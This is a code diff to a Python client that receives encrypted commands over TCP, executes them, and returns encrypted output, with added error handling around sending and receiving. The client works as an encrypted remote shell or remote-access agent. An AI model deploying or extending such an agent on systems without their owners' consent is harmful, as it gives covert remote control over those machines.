@@ -23,16 +23,25 @@ class Client:
         output = result.stdout.decode() + (result.stderr.decode() if result.stderr else "")
         print(output)
         ciphertext = self.security.encrypt(output)
-        Tcp.send(self.socket, ciphertext)
+        try:
+            Tcp.send(self.socket, ciphertext)
+        except Exception as e:
+            print(f"Failed to send data: {e}")
             
     def start(self):
         while True:
-            data = Tcp.recive(self.socket)
-            if not data:
+            try:
+                data = Tcp.recive(self.socket)
+                if not data:
+                    break
+                elif data == b"\x00":
+                    continue
+                else:
+                    command = self.security.decrypt(data)
+                    self.pool.submit(self.execute, command)
+            except Exception as e:
+                print(f"Error occurred: {e}")
                 break
-            if data.replace(b'\x00', b'') != b'':
-                command = self.security.decrypt(data)
-                self.pool.submit(self.execute, command)
                 
     def shutdown(self):
         self.socket.close()
